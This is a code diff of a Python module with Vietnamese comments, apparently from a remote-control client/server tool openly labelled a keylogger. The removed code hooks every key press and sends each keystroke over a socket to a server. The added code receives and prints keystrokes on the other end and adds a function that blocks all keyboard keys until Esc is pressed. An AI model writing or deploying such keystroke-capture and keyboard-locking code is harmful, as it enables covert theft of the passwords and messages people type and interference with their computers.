@@ -1,6 +1,7 @@
 import keyboard
 
 def receive_key_loggers(client_socket):
+    """Nhận và in các phím nhấn từ server."""
     while True:
         try:
             data = client_socket.recv(1024).decode()
@@ -12,18 +13,21 @@ def receive_key_loggers(client_socket):
             break
 
 def start_keylogger(client_socket):
-    def on_key_press(event):
-        try:
-            # Gửi phím nhấn tới server
-            keystroke = event.name
-            client_socket.send(keystroke.encode('utf-8'))
-        except Exception as e:
-            print(f"Lỗi khi gửi phím nhấn: {e}")
+    """Khởi động keylogger."""
+    print("Khởi động keylogger...")
+    # Bắt đầu ghi nhận phím nhấn
+    receive_key_loggers(client_socket)
 
-    # Bắt đầu lắng nghe phím nhấn và gửi tới server
-    print("Bắt đầu ghi nhận phím nhấn. Nhấn 'Esc' để dừng.")
-    keyboard.hook(on_key_press)
-
-    # Chờ phím 'Esc' để dừng bắt phím
+def block_keys():
+    """Khóa tất cả các phím trừ phím Esc để tắt chế độ khóa."""
+    for key in keyboard.all_modifiers + keyboard.all_normal_keys:
+        keyboard.block_key(key)
+    print("Bàn phím đã bị khóa. Nhấn 'Esc' để tắt chế độ khóa.")
     keyboard.wait('esc')
-    print("Đã dừng ghi nhận phím nhấn.")
+    unblock_keys()
+
+def unblock_keys():
+    """Mở khóa tất cả các phím."""
+    for key in keyboard.all_modifiers + keyboard.all_normal_keys:
+        keyboard.unblock_key(key)
+    print("Bàn phím đã được mở khóa.")
